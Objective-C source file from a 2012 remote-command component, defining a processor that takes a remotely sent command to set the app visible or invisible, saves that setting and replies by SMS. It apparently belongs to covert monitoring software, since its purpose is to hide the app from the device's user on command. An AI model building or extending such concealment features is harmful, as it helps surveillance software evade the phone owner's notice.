/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetVisibilityProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SetVisibilityProcessor.h"
#import "PrefVisibility.h"
#import "Preference.h"

@interface SetVisibilityProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) processSetVisibility;
- (void) setVisibilityException;
- (void) sendReplySMS;
@end

@implementation SetVisibilityProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetVisibilityProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(SetVisibilityProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetVisibilityProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetVisibilityProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SetVisibilityProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self processSetVisibility];
	else [self setVisibilityException];
	
}

#pragma mark SetVisibilityProcessor PrivateAPI Methods

/**
 - Method name: processSetVisibility
 - Purpose:This method is used to process set visibility
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processSetVisibility{
	DLog (@"SetVisibilityProcessor--->processSetVisibility");
	NSUInteger flagValue = [[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefVisibility *prefVisibility = (PrefVisibility *)[prefManager preference:kVisibility];
	[prefVisibility setMVisible:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefVisibility];
	[self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"SetVisibilityProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: setVisibilityException
 - Purpose:This method is invoked when set visiblity Process is failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) setVisibilityException {
	DLog (@"SetVisibilityProcessor--->setVisibilityException")
	FxException* exception = [FxException exceptionWithName:@"setVisibilityException" andReason:@"Set Visibility error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"SetVisibilityProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *setVisibilityMessage=NSLocalizedString(@"kVisibilityCmdMessage", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		setVisibilityMessage=[setVisibilityMessage stringByAppendingString:NSLocalizedString(@"kVisibilityCmdVisible", @"")];
	else 
    	setVisibilityMessage=[setVisibilityMessage stringByAppendingString:NSLocalizedString(@"kVisibilityCmdInvisible", @"")];
	
	setVisibilityMessage=[messageFormat stringByAppendingString:setVisibilityMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:setVisibilityMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:setVisibilityMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
